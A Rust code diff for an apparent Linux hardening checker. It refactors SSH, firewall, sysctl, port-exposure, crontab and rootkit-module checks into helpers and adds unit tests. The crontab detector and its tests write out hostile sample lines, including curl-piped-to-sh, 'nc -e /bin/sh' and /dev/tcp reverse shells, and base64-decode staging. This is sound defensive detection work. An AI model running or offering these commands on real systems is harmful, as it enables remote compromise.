@@ -98,13 +98,263 @@ struct CheckResult {
     findings: Vec<Finding>,
 }
 
+fn ssh_config_value(full_config: &str, key: &str) -> Option<String> {
+    for line in full_config.lines().rev() {
+        let trimmed = line.trim();
+        if trimmed.starts_with('#') || trimmed.is_empty() {
+            continue;
+        }
+        let parts: Vec<&str> = trimmed.splitn(2, char::is_whitespace).collect();
+        if parts.len() == 2 && parts[0].eq_ignore_ascii_case(key) {
+            return Some(parts[1].trim().to_string());
+        }
+    }
+    None
+}
+
+fn evaluate_ssh_config(full_config: &str, category: &'static str) -> (Vec<String>, Vec<Finding>) {
+    let mut passed = Vec::new();
+    let mut findings = Vec::new();
+
+    // Password authentication
+    match ssh_config_value(full_config, "PasswordAuthentication").as_deref() {
+        Some("no") => passed.push("Password authentication disabled".into()),
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::High,
+            title: "Password authentication is enabled".into(),
+            fix: "Set 'PasswordAuthentication no' in /etc/ssh/sshd_config".into(),
+        }),
+    }
+
+    // Root login
+    match ssh_config_value(full_config, "PermitRootLogin").as_deref() {
+        Some("no") | Some("prohibit-password") => {
+            passed.push("Root login restricted".into());
+        }
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::High,
+            title: "Root login via SSH is permitted".into(),
+            fix: "Set 'PermitRootLogin no' in /etc/ssh/sshd_config".into(),
+        }),
+    }
+
+    // Default port
+    match ssh_config_value(full_config, "Port").as_deref() {
+        Some("22") | None => findings.push(Finding {
+            category,
+            severity: Severity::Low,
+            title: "SSH running on default port 22".into(),
+            fix: "Consider changing to a non-standard port in /etc/ssh/sshd_config".into(),
+        }),
+        _ => passed.push("SSH on non-standard port".into()),
+    }
+
+    // MaxAuthTries
+    match ssh_config_value(full_config, "MaxAuthTries") {
+        Some(v) if v.parse::<u32>().unwrap_or(6) <= 3 => {
+            passed.push(format!("MaxAuthTries set to {v}"));
+        }
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::Medium,
+            title: "MaxAuthTries not restricted (default: 6)".into(),
+            fix: "Set 'MaxAuthTries 3' in /etc/ssh/sshd_config".into(),
+        }),
+    }
+
+    // Empty passwords
+    match ssh_config_value(full_config, "PermitEmptyPasswords").as_deref() {
+        Some("yes") => findings.push(Finding {
+            category,
+            severity: Severity::Critical,
+            title: "Empty passwords are permitted".into(),
+            fix: "Set 'PermitEmptyPasswords no' in /etc/ssh/sshd_config".into(),
+        }),
+        _ => passed.push("Empty passwords not permitted".into()),
+    }
+
+    (passed, findings)
+}
+
+fn firewalld_zone_is_recommended(zone: &str) -> bool {
+    matches!(zone, "drop" | "block" | "public")
+}
+
+fn ufw_is_active(status: &str) -> bool {
+    status.contains("Status: active")
+}
+
+fn ufw_default_is_deny_incoming(status: &str) -> bool {
+    status.contains("Default: deny (incoming)")
+}
+
+fn risky_open_services(ss_output: &str) -> Vec<&'static str> {
+    let risky_ports: Vec<(&str, &str)> = vec![
+        (":3306 ", "MySQL"),
+        (":5432 ", "PostgreSQL"),
+        (":6379 ", "Redis"),
+        (":27017", "MongoDB"),
+        (":11211", "Memcached"),
+    ];
+    risky_ports
+        .into_iter()
+        .filter_map(|(pattern, name)| {
+            if ss_output.contains(pattern) && ss_output.contains("0.0.0.0:") {
+                Some(name)
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn evaluate_kernel_sysctl_values(
+    aslr: Option<&str>,
+    syncookies: Option<&str>,
+    ip_forward: Option<&str>,
+    accept_redirects: Option<&str>,
+    accept_source_route: Option<&str>,
+    category: &'static str,
+) -> (Vec<String>, Vec<Finding>) {
+    let mut passed = Vec::new();
+    let mut findings = Vec::new();
+
+    match aslr {
+        Some("2") => passed.push("ASLR fully enabled".into()),
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::High,
+            title: "ASLR not fully enabled".into(),
+            fix: "Run: sudo sysctl -w kernel.randomize_va_space=2".into(),
+        }),
+    }
+
+    match syncookies {
+        Some("1") => passed.push("SYN cookies enabled".into()),
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::Medium,
+            title: "SYN cookies not enabled (SYN flood risk)".into(),
+            fix: "Run: sudo sysctl -w net.ipv4.tcp_syncookies=1".into(),
+        }),
+    }
+
+    match ip_forward {
+        Some("0") => passed.push("IP forwarding disabled".into()),
+        Some("1") => findings.push(Finding {
+            category,
+            severity: Severity::Low,
+            title: "IP forwarding is enabled".into(),
+            fix: "If not needed: sudo sysctl -w net.ipv4.ip_forward=0".into(),
+        }),
+        _ => {}
+    }
+
+    match accept_redirects {
+        Some("0") => passed.push("ICMP redirects rejected".into()),
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::Medium,
+            title: "ICMP redirects accepted (MITM risk)".into(),
+            fix: "Run: sudo sysctl -w net.ipv4.conf.all.accept_redirects=0".into(),
+        }),
+    }
+
+    match accept_source_route {
+        Some("0") => passed.push("Source routing disabled".into()),
+        _ => findings.push(Finding {
+            category,
+            severity: Severity::Medium,
+            title: "Source routing accepted".into(),
+            fix: "Run: sudo sysctl -w net.ipv4.conf.all.accept_source_route=0".into(),
+        }),
+    }
+
+    (passed, findings)
+}
+
+fn is_service_exposure_line_safe(line: &str) -> bool {
+    line.contains(":22 ")
+        || line.contains(":80 ")
+        || line.contains(":443 ")
+        || line.contains(":53 ")
+        || line.contains(":8787 ")
+        || line.contains(":8790 ")
+        || line.contains(":2222 ")
+        || line.contains("innerwarden")
+        || line.contains("docker-proxy")
+        || line.contains("containerd")
+}
+
+fn exposed_service_lines(ss_output: &str) -> Vec<String> {
+    ss_output
+        .lines()
+        .filter(|line| line.contains("0.0.0.0:") || line.contains(":::"))
+        .filter(|line| !is_service_exposure_line_safe(line))
+        .map(|line| line.to_string())
+        .collect()
+}
+
+fn suspicious_crontab_reason(line: &str) -> Option<&'static str> {
+    let lower = line.to_lowercase();
+    let trimmed = lower.trim();
+    if trimmed.is_empty() || trimmed.starts_with('#') {
+        return None;
+    }
+    if (lower.contains("curl") || lower.contains("wget"))
+        && (lower.contains("| sh")
+            || lower.contains("|sh")
+            || lower.contains("| bash")
+            || lower.contains("|bash"))
+    {
+        return Some("download and execute (curl/wget piped to sh/bash)");
+    }
+    if lower.contains("/dev/tcp") || lower.contains("nc -e") || lower.contains("ncat -e") {
+        return Some("possible reverse shell (nc / /dev/tcp)");
+    }
+    if lower.contains("base64 -d") || lower.contains("base64 --decode") {
+        return Some("base64 decode (potential obfuscation)");
+    }
+    if lower.contains("> /tmp/") || lower.contains(">/tmp/") {
+        return Some("writes to /tmp (common staging directory)");
+    }
+    None
+}
+
+fn classify_loaded_modules(
+    lsmod_output: &str,
+    rootkit_modules: &[&str],
+    known_good: &[&str],
+) -> (Vec<String>, Vec<String>) {
+    let mut rootkits = Vec::new();
+    let mut unknowns = Vec::new();
+
+    for line in lsmod_output.lines().skip(1) {
+        let Some(module) = line.split_whitespace().next() else {
+            continue;
+        };
+        if rootkit_modules
+            .iter()
+            .any(|rootkit| module.eq_ignore_ascii_case(rootkit))
+        {
+            rootkits.push(module.to_string());
+            continue;
+        }
+        if !known_good.contains(&module) {
+            unknowns.push(module.to_string());
+        }
+    }
+
+    (rootkits, unknowns)
+}
+
 // ---------------------------------------------------------------------------
 // Individual checks
 // ---------------------------------------------------------------------------
 
 fn check_ssh() -> CheckResult {
-    let mut passed = Vec::new();
-    let mut findings = Vec::new();
     let cat = "SSH";
 
     let sshd_config = fs::read_to_string("/etc/ssh/sshd_config").unwrap_or_default();
@@ -119,78 +369,7 @@ fn check_ssh() -> CheckResult {
         }
     }
 
-    let get = |key: &str| -> Option<String> {
-        for line in full_config.lines().rev() {
-            let trimmed = line.trim();
-            if trimmed.starts_with('#') || trimmed.is_empty() {
-                continue;
-            }
-            let parts: Vec<&str> = trimmed.splitn(2, char::is_whitespace).collect();
-            if parts.len() == 2 && parts[0].eq_ignore_ascii_case(key) {
-                return Some(parts[1].trim().to_string());
-            }
-        }
-        None
-    };
-
-    // Password authentication
-    match get("PasswordAuthentication").as_deref() {
-        Some("no") => passed.push("Password authentication disabled".into()),
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::High,
-            title: "Password authentication is enabled".into(),
-            fix: "Set 'PasswordAuthentication no' in /etc/ssh/sshd_config".into(),
-        }),
-    }
-
-    // Root login
-    match get("PermitRootLogin").as_deref() {
-        Some("no") | Some("prohibit-password") => {
-            passed.push("Root login restricted".into());
-        }
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::High,
-            title: "Root login via SSH is permitted".into(),
-            fix: "Set 'PermitRootLogin no' in /etc/ssh/sshd_config".into(),
-        }),
-    }
-
-    // Default port
-    match get("Port").as_deref() {
-        Some("22") | None => findings.push(Finding {
-            category: cat,
-            severity: Severity::Low,
-            title: "SSH running on default port 22".into(),
-            fix: "Consider changing to a non-standard port in /etc/ssh/sshd_config".into(),
-        }),
-        _ => passed.push("SSH on non-standard port".into()),
-    }
-
-    // MaxAuthTries
-    match get("MaxAuthTries") {
-        Some(v) if v.parse::<u32>().unwrap_or(6) <= 3 => {
-            passed.push(format!("MaxAuthTries set to {v}"));
-        }
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::Medium,
-            title: "MaxAuthTries not restricted (default: 6)".into(),
-            fix: "Set 'MaxAuthTries 3' in /etc/ssh/sshd_config".into(),
-        }),
-    }
-
-    // Empty passwords
-    match get("PermitEmptyPasswords").as_deref() {
-        Some("yes") => findings.push(Finding {
-            category: cat,
-            severity: Severity::Critical,
-            title: "Empty passwords are permitted".into(),
-            fix: "Set 'PermitEmptyPasswords no' in /etc/ssh/sshd_config".into(),
-        }),
-        _ => passed.push("Empty passwords not permitted".into()),
-    }
+    let (passed, findings) = evaluate_ssh_config(&full_config, cat);
 
     CheckResult {
         category: cat,
@@ -220,7 +399,7 @@ fn check_firewall() -> CheckResult {
             .output()
         {
             let zone = String::from_utf8_lossy(&out.stdout).trim().to_string();
-            if zone == "drop" || zone == "block" || zone == "public" {
+            if firewalld_zone_is_recommended(&zone) {
                 passed.push(format!("Default zone: {zone}"));
             } else {
                 findings.push(Finding {
@@ -243,11 +422,11 @@ fn check_firewall() -> CheckResult {
         match ufw {
             Ok(out) => {
                 let status = String::from_utf8_lossy(&out.stdout);
-                if status.contains("Status: active") {
+                if ufw_is_active(&status) {
                     passed.push("UFW firewall is active".into());
 
                     // Check default policy
-                    if status.contains("Default: deny (incoming)") {
+                    if ufw_default_is_deny_incoming(&status) {
                         passed.push("Default incoming policy: deny".into());
                     } else {
                         findings.push(Finding {
@@ -298,24 +477,15 @@ fn check_firewall() -> CheckResult {
     // Check open ports
     if let Ok(out) = Command::new("ss").args(["-tlnp"]).output() {
         let lines = String::from_utf8_lossy(&out.stdout);
-        let risky_ports: Vec<(&str, &str)> = vec![
-            (":3306 ", "MySQL"),
-            (":5432 ", "PostgreSQL"),
-            (":6379 ", "Redis"),
-            (":27017", "MongoDB"),
-            (":11211", "Memcached"),
-        ];
-        for (pattern, name) in &risky_ports {
-            if lines.contains(pattern) && lines.contains("0.0.0.0:") {
-                findings.push(Finding {
-                    category: cat,
-                    severity: Severity::High,
-                    title: format!("{name} is listening on all interfaces"),
-                    fix: format!(
-                        "Bind {name} to 127.0.0.1 only, or restrict access with firewall rules"
-                    ),
-                });
-            }
+        for service in risky_open_services(&lines) {
+            findings.push(Finding {
+                category: cat,
+                severity: Severity::High,
+                title: format!("{service} is listening on all interfaces"),
+                fix: format!(
+                    "Bind {service} to 127.0.0.1 only, or restrict access with firewall rules"
+                ),
+            });
         }
     }
 
@@ -327,69 +497,20 @@ fn check_firewall() -> CheckResult {
 }
 
 fn check_kernel() -> CheckResult {
-    let mut passed = Vec::new();
-    let mut findings = Vec::new();
     let cat = "Kernel";
 
     let read_sysctl = |path: &str| -> Option<String> {
         fs::read_to_string(path).ok().map(|s| s.trim().to_string())
     };
 
-    // ASLR
-    match read_sysctl("/proc/sys/kernel/randomize_va_space").as_deref() {
-        Some("2") => passed.push("ASLR fully enabled".into()),
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::High,
-            title: "ASLR not fully enabled".into(),
-            fix: "Run: sudo sysctl -w kernel.randomize_va_space=2".into(),
-        }),
-    }
-
-    // SYN cookies
-    match read_sysctl("/proc/sys/net/ipv4/tcp_syncookies").as_deref() {
-        Some("1") => passed.push("SYN cookies enabled".into()),
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::Medium,
-            title: "SYN cookies not enabled (SYN flood risk)".into(),
-            fix: "Run: sudo sysctl -w net.ipv4.tcp_syncookies=1".into(),
-        }),
-    }
-
-    // IP forwarding (should be off unless needed)
-    match read_sysctl("/proc/sys/net/ipv4/ip_forward").as_deref() {
-        Some("0") => passed.push("IP forwarding disabled".into()),
-        Some("1") => findings.push(Finding {
-            category: cat,
-            severity: Severity::Low,
-            title: "IP forwarding is enabled".into(),
-            fix: "If not needed: sudo sysctl -w net.ipv4.ip_forward=0".into(),
-        }),
-        _ => {}
-    }
-
-    // ICMP redirects
-    match read_sysctl("/proc/sys/net/ipv4/conf/all/accept_redirects").as_deref() {
-        Some("0") => passed.push("ICMP redirects rejected".into()),
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::Medium,
-            title: "ICMP redirects accepted (MITM risk)".into(),
-            fix: "Run: sudo sysctl -w net.ipv4.conf.all.accept_redirects=0".into(),
-        }),
-    }
-
-    // Source routing
-    match read_sysctl("/proc/sys/net/ipv4/conf/all/accept_source_route").as_deref() {
-        Some("0") => passed.push("Source routing disabled".into()),
-        _ => findings.push(Finding {
-            category: cat,
-            severity: Severity::Medium,
-            title: "Source routing accepted".into(),
-            fix: "Run: sudo sysctl -w net.ipv4.conf.all.accept_source_route=0".into(),
-        }),
-    }
+    let (passed, findings) = evaluate_kernel_sysctl_values(
+        read_sysctl("/proc/sys/kernel/randomize_va_space").as_deref(),
+        read_sysctl("/proc/sys/net/ipv4/tcp_syncookies").as_deref(),
+        read_sysctl("/proc/sys/net/ipv4/ip_forward").as_deref(),
+        read_sysctl("/proc/sys/net/ipv4/conf/all/accept_redirects").as_deref(),
+        read_sysctl("/proc/sys/net/ipv4/conf/all/accept_source_route").as_deref(),
+        cat,
+    );
 
     CheckResult {
         category: cat,
@@ -733,26 +854,7 @@ fn check_services() -> CheckResult {
     // Check for commonly exploited services exposed on all interfaces
     if let Ok(out) = Command::new("ss").args(["-tlnp"]).output() {
         let lines = String::from_utf8_lossy(&out.stdout);
-
-        // Check if any service binds to 0.0.0.0 on unusual ports
-        let listening_all: Vec<String> = lines
-            .lines()
-            .filter(|l| l.contains("0.0.0.0:") || l.contains(":::"))
-            .filter(|l| {
-                // Exclude standard and known-safe ports
-                !l.contains(":22 ")
-                    && !l.contains(":80 ")
-                    && !l.contains(":443 ")
-                    && !l.contains(":53 ")       // DNS
-                    && !l.contains(":8787 ")     // Inner Warden dashboard
-                    && !l.contains(":8790 ")     // Inner Warden mesh
-                    && !l.contains(":2222 ")     // Inner Warden honeypot
-                    && !l.contains("innerwarden") // any Inner Warden process
-                    && !l.contains("docker-proxy") // Docker managed ports
-                    && !l.contains("containerd")
-            })
-            .map(|l| l.to_string())
-            .collect();
+        let listening_all = exposed_service_lines(&lines);
 
         if listening_all.len() > 5 {
             findings.push(Finding {
@@ -796,38 +898,6 @@ fn check_crontabs() -> CheckResult {
     let mut findings = Vec::new();
     let cat = "Crontabs";
 
-    // Patterns that indicate suspicious crontab entries.
-    let suspicious = |line: &str| -> Option<&'static str> {
-        let lower = line.to_lowercase();
-        // Skip comments and empty lines.
-        let trimmed = lower.trim();
-        if trimmed.is_empty() || trimmed.starts_with('#') {
-            return None;
-        }
-        // Download + execute: curl/wget piped to sh/bash
-        if (lower.contains("curl") || lower.contains("wget"))
-            && (lower.contains("| sh")
-                || lower.contains("|sh")
-                || lower.contains("| bash")
-                || lower.contains("|bash"))
-        {
-            return Some("download and execute (curl/wget piped to sh/bash)");
-        }
-        // Reverse shell indicators
-        if lower.contains("/dev/tcp") || lower.contains("nc -e") || lower.contains("ncat -e") {
-            return Some("possible reverse shell (nc / /dev/tcp)");
-        }
-        // Base64 decode
-        if lower.contains("base64 -d") || lower.contains("base64 --decode") {
-            return Some("base64 decode (potential obfuscation)");
-        }
-        // Write to /tmp
-        if lower.contains("> /tmp/") || lower.contains(">/tmp/") {
-            return Some("writes to /tmp (common staging directory)");
-        }
-        None
-    };
-
     let mut scanned: usize = 0;
 
     // Helper: scan all files in a directory.
@@ -841,7 +911,7 @@ fn check_crontabs() -> CheckResult {
                 if let Ok(contents) = fs::read_to_string(&path) {
                     scanned += 1;
                     for (lineno, line) in contents.lines().enumerate() {
-                        if let Some(reason) = suspicious(line) {
+                        if let Some(reason) = suspicious_crontab_reason(line) {
                             findings.push(Finding {
                                 category: cat,
                                 severity: Severity::Medium,
@@ -867,7 +937,7 @@ fn check_crontabs() -> CheckResult {
     if let Ok(contents) = fs::read_to_string("/etc/crontab") {
         scanned += 1;
         for (lineno, line) in contents.lines().enumerate() {
-            if let Some(reason) = suspicious(line) {
+            if let Some(reason) = suspicious_crontab_reason(line) {
                 findings.push(Finding {
                     category: cat,
                     severity: Severity::Medium,
@@ -1211,35 +1281,17 @@ fn check_kernel_modules() -> CheckResult {
     match Command::new("lsmod").output() {
         Ok(out) => {
             let output = String::from_utf8_lossy(&out.stdout);
-            let mut unknown_modules: Vec<String> = Vec::new();
-
-            for line in output.lines().skip(1) {
-                // lsmod format: module_name  size  used_by
-                let module = match line.split_whitespace().next() {
-                    Some(m) => m,
-                    None => continue,
-                };
-
-                // Check rootkit modules first (Critical).
-                if rootkit_modules
-                    .iter()
-                    .any(|r| module.eq_ignore_ascii_case(r))
-                {
-                    findings.push(Finding {
-                        category: cat,
-                        severity: Severity::Critical,
-                        title: format!("Known rootkit module loaded: {module}"),
-                        fix: format!(
-                            "Investigate immediately - remove with: sudo rmmod {module} && audit the system"
-                        ),
-                    });
-                    continue;
-                }
-
-                // Flag unknown modules as Low.
-                if !known_good.contains(&module) {
-                    unknown_modules.push(module.to_string());
-                }
+            let (rootkits, unknown_modules) =
+                classify_loaded_modules(&output, rootkit_modules, known_good);
+            for module in &rootkits {
+                findings.push(Finding {
+                    category: cat,
+                    severity: Severity::Critical,
+                    title: format!("Known rootkit module loaded: {module}"),
+                    fix: format!(
+                        "Investigate immediately - remove with: sudo rmmod {module} && audit the system"
+                    ),
+                });
             }
 
             if !unknown_modules.is_empty() {
@@ -2033,6 +2085,254 @@ pub fn cmd_harden(verbose: bool) -> Result<()> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn load_ignore_list_returns_empty_when_file_is_missing() {
+        // Exercises missing-file path so harden ignore loading stays fail-safe.
+        let path = Path::new("/tmp/innerwarden-definitely-missing-ignore.toml");
+        let ignore = load_ignore_list(path);
+        assert!(ignore.is_empty());
+    }
+
+    #[test]
+    fn is_ignored_matches_case_insensitive_substrings() {
+        // Verifies ignore matching is case-insensitive and uses substring semantics.
+        let mut ignore = HashSet::new();
+        ignore.insert("IP forwarding".to_string());
+        assert!(is_ignored("Warning: ip FORWARDING is enabled", &ignore));
+        assert!(!is_ignored("Kernel ASLR fully enabled", &ignore));
+    }
+
+    #[test]
+    fn severity_score_penalty_tracks_risk_levels() {
+        // Guards scoring weights so harder findings always penalize more than soft ones.
+        assert_eq!(Severity::Info.score_penalty(), 0);
+        assert_eq!(Severity::Low.score_penalty(), 2);
+        assert_eq!(Severity::Medium.score_penalty(), 5);
+        assert_eq!(Severity::High.score_penalty(), 10);
+        assert_eq!(Severity::Critical.score_penalty(), 20);
+    }
+
+    #[test]
+    fn ssh_config_value_prefers_last_directive_and_ignores_comments() {
+        // Covers ssh directive resolution order where the last active value should win.
+        let config = r#"
+            # PasswordAuthentication yes
+            PasswordAuthentication yes
+            passwordauthentication no
+        "#;
+        assert_eq!(
+            ssh_config_value(config, "PasswordAuthentication")
+                .expect("directive should be present"),
+            "no"
+        );
+    }
+
+    #[test]
+    fn ssh_config_value_returns_none_for_missing_directive() {
+        // Ensures missing directives remain None so caller logic can apply defaults safely.
+        let config = "Port 2222\n";
+        assert!(ssh_config_value(config, "PermitRootLogin").is_none());
+    }
+
+    #[test]
+    fn evaluate_ssh_config_hardened_profile_has_no_findings() {
+        // Validates happy path for hardened SSH policy across all evaluated directives.
+        let config = r#"
+            PasswordAuthentication no
+            PermitRootLogin no
+            Port 2222
+            MaxAuthTries 3
+            PermitEmptyPasswords no
+        "#;
+        let (_passed, findings) = evaluate_ssh_config(config, "SSH");
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn evaluate_ssh_config_insecure_profile_flags_high_and_critical_findings() {
+        // Exercises insecure defaults to ensure each branch emits the expected hardening findings.
+        let config = r#"
+            PasswordAuthentication yes
+            PermitRootLogin yes
+            Port 22
+            MaxAuthTries 8
+            PermitEmptyPasswords yes
+        "#;
+        let (_passed, findings) = evaluate_ssh_config(config, "SSH");
+        assert!(findings
+            .iter()
+            .any(|f| f.title.contains("Password authentication")));
+        assert!(findings
+            .iter()
+            .any(|f| f.title.contains("Root login via SSH")));
+        assert!(findings.iter().any(|f| f.title.contains("Empty passwords")));
+    }
+
+    #[test]
+    fn firewalld_zone_recommendation_accepts_expected_zones() {
+        // Guards allowed-zone list used when evaluating firewalld defaults.
+        assert!(firewalld_zone_is_recommended("drop"));
+        assert!(firewalld_zone_is_recommended("block"));
+        assert!(firewalld_zone_is_recommended("public"));
+    }
+
+    #[test]
+    fn firewalld_zone_recommendation_rejects_other_zones() {
+        // Confirms non-recommended default zones trigger findings in firewall checks.
+        assert!(!firewalld_zone_is_recommended("home"));
+        assert!(!firewalld_zone_is_recommended("trusted"));
+    }
+
+    #[test]
+    fn ufw_status_helpers_parse_active_and_default_policy() {
+        // Ensures UFW text parsing keeps the active-state and deny-policy decisions stable.
+        let status = "Status: active\nDefault: deny (incoming), allow (outgoing)";
+        assert!(ufw_is_active(status));
+        assert!(ufw_default_is_deny_incoming(status));
+    }
+
+    #[test]
+    fn risky_open_services_flags_database_ports_on_wildcard_bind() {
+        // Covers risky-port detection path used to flag services exposed on all interfaces.
+        let ss = "LISTEN 0 128 0.0.0.0:3306 users:(\"mysqld\")\n\
+LISTEN 0 128 0.0.0.0:6379 users:(\"redis\")\n";
+        let services = risky_open_services(ss);
+        assert!(services.contains(&"MySQL"));
+        assert!(services.contains(&"Redis"));
+    }
+
+    #[test]
+    fn risky_open_services_ignores_localhost_only_binds() {
+        // Verifies risky-port scanner does not flag localhost-only listeners.
+        let ss = "LISTEN 0 128 127.0.0.1:3306\nLISTEN 0 128 127.0.0.1:6379\n";
+        let services = risky_open_services(ss);
+        assert!(services.is_empty());
+    }
+
+    #[test]
+    fn evaluate_kernel_sysctl_values_hardened_profile_passes() {
+        // Exercises fully hardened sysctl combination to ensure no false-positive findings.
+        let (_passed, findings) = evaluate_kernel_sysctl_values(
+            Some("2"),
+            Some("1"),
+            Some("0"),
+            Some("0"),
+            Some("0"),
+            "Kernel",
+        );
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn evaluate_kernel_sysctl_values_unhardened_profile_reports_expected_risks() {
+        // Covers degraded sysctl combinations and verifies risk severities are emitted.
+        let (_passed, findings) = evaluate_kernel_sysctl_values(
+            Some("0"),
+            Some("0"),
+            Some("1"),
+            Some("1"),
+            Some("1"),
+            "Kernel",
+        );
+        assert!(findings
+            .iter()
+            .any(|f| f.severity == Severity::High && f.title.contains("ASLR")));
+        assert!(findings
+            .iter()
+            .any(|f| f.severity == Severity::Low && f.title.contains("IP forwarding")));
+        assert!(findings.iter().any(|f| f.title.contains("Source routing")));
+    }
+
+    #[test]
+    fn is_service_exposure_line_safe_whitelists_expected_ports_and_processes() {
+        // Ensures known-safe listeners do not inflate exposure finding counts.
+        assert!(is_service_exposure_line_safe(
+            "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")"
+        ));
+        assert!(is_service_exposure_line_safe(
+            "LISTEN 0 128 0.0.0.0:8787 users:(\"innerwarden-agent\")"
+        ));
+        assert!(is_service_exposure_line_safe(
+            "LISTEN 0 128 :::443 users:(\"nginx\")"
+        ));
+    }
+
+    #[test]
+    fn exposed_service_lines_returns_only_unusual_exposures() {
+        // Verifies service exposure filtering keeps suspicious wildcard listeners while dropping safe ones.
+        let ss = "\
+LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n\
+LISTEN 0 128 0.0.0.0:5000 users:(\"python\")\n\
+LISTEN 0 128 :::3307 users:(\"custom\")\n\
+";
+        let exposed = exposed_service_lines(ss);
+        assert_eq!(exposed.len(), 2);
+        assert!(exposed.iter().any(|line| line.contains(":5000")));
+        assert!(exposed.iter().any(|line| line.contains(":3307")));
+    }
+
+    #[test]
+    fn suspicious_crontab_reason_detects_download_execute_patterns() {
+        // Exercises malware-stager detection for curl/wget piped into shell interpreters.
+        assert!(suspicious_crontab_reason("*/5 * * * * curl http://x | sh").is_some());
+        assert!(suspicious_crontab_reason("*/5 * * * * wget http://x |bash").is_some());
+    }
+
+    #[test]
+    fn suspicious_crontab_reason_detects_reverse_shell_patterns() {
+        // Ensures reverse-shell indicators remain classified as suspicious cron activity.
+        assert!(suspicious_crontab_reason("* * * * * nc -e /bin/sh 1.2.3.4 4444").is_some());
+        assert!(
+            suspicious_crontab_reason("* * * * * bash -c 'cat </dev/tcp/1.2.3.4/4444'").is_some()
+        );
+    }
+
+    #[test]
+    fn suspicious_crontab_reason_detects_obfuscation_and_tmp_staging() {
+        // Covers obfuscation and tmp-write patterns that should trigger manual review findings.
+        assert!(suspicious_crontab_reason("* * * * * echo abc | base64 -d | sh").is_some());
+        assert!(suspicious_crontab_reason("* * * * * echo hi > /tmp/p.sh").is_some());
+    }
+
+    #[test]
+    fn suspicious_crontab_reason_ignores_comments_and_benign_lines() {
+        // Confirms parser skips comments/blank lines and does not flag normal maintenance jobs.
+        assert_eq!(suspicious_crontab_reason("# comment"), None);
+        assert_eq!(suspicious_crontab_reason(""), None);
+        assert_eq!(
+            suspicious_crontab_reason("0 3 * * * /usr/bin/find /var/log -type f -mtime +7 -delete"),
+            None
+        );
+    }
+
+    #[test]
+    fn classify_loaded_modules_flags_rootkits_and_unknown_modules() {
+        // Validates rootkit matching and unknown-module bucketing from lsmod text parsing.
+        let output = "\
+Module                  Size  Used by\n\
+diamorphine            16384  0\n\
+mystery_mod            20480  0\n\
+ext4                  999999  1\n\
+";
+        let (rootkits, unknowns) = classify_loaded_modules(output, &["diamorphine"], &["ext4"]);
+        assert_eq!(rootkits, vec!["diamorphine"]);
+        assert_eq!(unknowns, vec!["mystery_mod"]);
+    }
+
+    #[test]
+    fn classify_loaded_modules_ignores_known_good_entries() {
+        // Ensures known-good modules are not misclassified as unusual.
+        let output = "\
+Module                  Size  Used by\n\
+ext4                  999999  1\n\
+nf_tables             123456  2\n\
+";
+        let (rootkits, unknowns) =
+            classify_loaded_modules(output, &["diamorphine"], &["ext4", "nf_tables"]);
+        assert!(rootkits.is_empty());
+        assert!(unknowns.is_empty());
+    }
 
     // --- Nginx tests --------------------------------------------------------
 
